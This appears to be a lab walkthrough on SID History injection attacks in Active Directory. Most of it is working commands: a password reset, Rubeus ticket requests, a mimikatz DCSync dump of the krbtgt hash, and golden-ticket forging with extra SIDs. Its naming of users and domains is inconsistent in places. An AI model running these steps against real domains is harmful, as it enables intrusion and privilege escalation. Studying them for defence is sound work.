## What is?
SID History Injection Attack, also known as SID Hijacking, is a technique used to elevate privileges by leveraging the SID (Security Identifier) history attribute of Active Directory user accounts. When a user account is migrated from one domain to another domain in a different forest, its SID history attribute retains the SIDs from the previous domain.

## What is SID History?
If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
In scenarios where `SID history` is enabled between two forests, an `extra-SIDs` attack can potentially be performed. However, it's essential to note that `SID filtering` is typically enabled by default between forests. This means that any SID with a Relative Identifier (RID) less than 1000 will be filtered out. <font color="#ff0000">Despite this limitation, attackers can still leverage SIDs with RIDs equal to or exceeding 1000, especially those associated with high-privileged accounts in the domain.</font> These accounts may include users or groups having high privileged access. 

## How it works?
An attacker exploits this feature by injecting the SID of a highly privileged group or user from the target domain into a low-privileged user account in the source domain. By doing so, the low-privileged user account inherits the access rights and privileges associated with the injected SID. This allows the attacker to escalate privileges and gain unauthorized access to resources or perform actions within the target domain as if they were a member of the highly privileged group or user.

# Attacks
## Scenario 1(High Privileged Migrated User)
![](attachment/28d368c9c875bcf704ad82086d2afb4b.png)
Imagine the user *Sentinel* has been migrated from from the `logistics.ad` domain to the `inlanefreight.ad` domain and the SID history has been retained.
What if?
- *Sentinel* was part of the **Infrastructure Group** on *inlanefreight.ad* domain? 
- Then the SID will be retained in the "cloned" user in the new domain(`inlanefreight.ad`) 
- Consequently, even though `Sentinal` is now a standard `Domain User` in the `inlanefreight.ad` domain, it retains the SID history of its previous domain membership, allowing it to access resources within the `logistics.ad` domain with the privileges of an `Administrator`. This presents a significant security risk, as a seemingly ordinary user can now wield elevated permissions within the `logistics.ad` domain.

You will enumerate the migrated destination domain for users with **SIDHistory** filled in.
```powershell-session
Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory

DistinguishedName : CN=sentinal,CN=Users,DC=inlanefreight,DC=ad
Enabled           : True
GivenName         : sentinal
Name              : sentinal
ObjectClass       : user
ObjectGUID        : a0304e33-8f23-4020-bd7e-78abe1fe0649
SamAccountName    : sentinal
SID               : S-1-5-21-2432454459-173448545-3375717855-2601
SIDHistory        : {S-1-5-21-186204973-2882451676-2899969076-2602}
Surname           :
UserPrincipalName : sentinal@inlanefreight.ad
```
This shows that the user has been migrated **logistics.ad -> inlanefreight.ad.**
*EXTRA: We can reset its password(if we don't have it already Off-course!)*
```powershell-session
net user sentinal sentinal
The command completed successfully.
```
Create a sacrificial logon so we don't need to mess up with kerberos tickets.
```powershell-session
./Rubeus createnetonly /program:powershell.exe /show
```
Request a TGT on the sacrificial session as **Sentinal**.
```powershell-session
.\Rubeus.exe asktgt /user:sentinal /password:sentinal /domain:inlanefreight.ad /ptt
```
Now we will still be able to retain *Administrator* permission over the **old domain(logistics.ad)**  while being over the new **migrated domain(inlanefreight.ad)**.
```powershell-session
Enter-PSSession DC02.logistics.ad
[DC02.logistics.ad]: PS C:\Users\sentinal\Documents> hostname;whoami
DC02
inlanefreight\sentinal
```

## Scenario 2(Low Privileged Migrated User)
In scenarios where migrated users do not possess substantial privileges in their previous domain or no users are migrated, it's advisable to verify if `SID History` is still enabled on the domain. By confirming the status of SID History, we can inject the SID of high-privilege users into existing user accounts, leveraging the residual SID associations to gain elevated privileges within the domain.

We must first identify if the **SIDHistory** is enabled on the new Forest.
```powershell-session
PS C:\Tools> Get-DomainTrust -domain logistics.ad

SourceName      : logistics.ad
TargetName      : inlanefreight.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 12/26/2023 4:13:40 PM
WhenChanged     : 3/13/2024 1:02:44 PM                 
```
Since **TREAT_AS_EXTERNAL** is present under the **Trust Attributes** then we know *SIDHistory* exist on the new domain.
<font color="#ff0000">Now we must still remember that filtering is in place and all SID lower than 1000 can't be used.</font>
We need to scout for possible users that are not part of these SIDs and we can do it in Bloodhound, finding that *Infrastructure groups* which is part of *Domain Admins* via nested groups have **SID=2602**.
Now we can execute the *extrasids* attack! We need to obtain the NTLM hash of the *krbtgt* of the old domain.
```powershell-session
 .\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt" exit
```
Obtain the SID of the old domain.
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainSID
S-1-5-21-2432454459-173448545-3375717855
```
Obtain the SID of the Infrastructure group of the *new domain*.
```powershell-session
Get-ADGroup -Identity "Infrastructure" -Server "logistics.ad"
```
At this point, we have gathered the following data points:
- The KRBTGT hash for the old domain (Inlanefreight) - `119885a9af438d1ef0d7543bed8b9ea1`
- The SID for the old domain - `S-1-5-21-2432454459-173448545-3375717855`
- The name of a target user in the old domain (Any domain user) - `jimmy`
- The FQDN of the old domain. - `inlanefreight.ad`
- The SID of the high privileged group of the migrated domain (Infrastructure group) - `S-1-5-21-186204973-2882451676-2899969076-2602`

Now we can build a golden ticket.
```powershell-session
.\Rubeus.exe golden /rc4:119885a9af438d1ef0d7543bed8b9ea1 /domain:inlanefreight.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /sids:S-1-5-21-186204973-2882451676-2899969076-2602 /user:jimmy /ptt

//Or via mimikatz.exe
mimikatz # kerberos::golden /user:jimmy /domain:inlanefreight.ad  /sid:S-1-5-21-2432454459-173448545-3375717855 /sids:S-1-5-21-186204973-2882451676-2899969076-2602 /krbtgt:119885a9af438d1ef0d7543bed8b9ea1 /ptt
```
<font color="#ff0000">With the obtained ticket for user `INLANEFREIGHT\jimmy`, which has `extra-sid` of `Infrastructure` group within the `Logistics` domain, we now possess the capability to exemplify this authority by accessing the logistics domain.</font>
